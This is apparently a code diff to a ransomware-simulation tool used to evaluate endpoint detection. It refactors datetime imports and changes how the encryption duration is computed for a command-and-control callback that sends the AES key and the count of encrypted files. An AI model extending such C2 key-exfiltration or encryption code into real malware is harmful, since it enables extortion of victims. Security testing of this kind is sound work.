@@ -31,6 +31,8 @@ import argparse
 import json
 import os
 import sys
+from datetime import datetime as dt
+from datetime import timezone
 
 import config
 from modules.callback import C2Integration
@@ -184,7 +186,9 @@ def run_c2_callback(report: SimulationReport, key: bytes) -> None:
     c2_payload = c2._to_payload(
         aes_key=key.hex(),
         file_encrypted=report.total_files_encrypted,
-        duration=report.encryption_duration_seconds,
+        duration=(
+            dt.now(timezone.utc) - dt.fromisoformat(report.simulation_start_time)
+        ).total_seconds(),
     )
     c2.send(c2_payload)
 
@@ -224,7 +228,6 @@ def run_decrypt() -> None:
     if config.REPORT_FILE.exists():
         existing = json.loads(config.REPORT_FILE.read_text(encoding="utf-8"))
         # Restore timeline state so finalize() keeps Groups 1/2/3 intact
-        from datetime import datetime
 
         try:
             collector._start_time = (
@@ -313,8 +316,6 @@ def run_add_edr(
     existing = json.loads(config.REPORT_FILE.read_text(encoding="utf-8"))
 
     # Reconstruct collector state from report so finalize() preserves everything
-    from datetime import datetime
-
     collector = EvaluationCollector()
 
     # Restore Groups 1/2/5 from existing report fields
@@ -339,7 +340,7 @@ def run_add_edr(
             if r["success"] and r["encrypted_at"]:
                 try:
                     collector._file_timestamps.append(
-                        datetime.fromisoformat(r["encrypted_at"])
+                        dt.fromisoformat(r["encrypted_at"])
                     )
                 except ValueError:
                     pass
@@ -347,21 +348,17 @@ def run_add_edr(
 
     if existing.get("simulation_start_time"):
         try:
-            collector._start_time = datetime.fromisoformat(
-                existing["simulation_start_time"]
-            )
+            collector._start_time = dt.fromisoformat(existing["simulation_start_time"])
         except ValueError:
             pass
     if existing.get("simulation_end_time"):
         try:
-            collector._end_time = datetime.fromisoformat(
-                existing["simulation_end_time"]
-            )
+            collector._end_time = dt.fromisoformat(existing["simulation_end_time"])
         except ValueError:
             pass
     if existing.get("ransom_note_drop_time"):
         try:
-            collector._note_drop_time = datetime.fromisoformat(
+            collector._note_drop_time = dt.fromisoformat(
                 existing["ransom_note_drop_time"]
             )
         except ValueError:
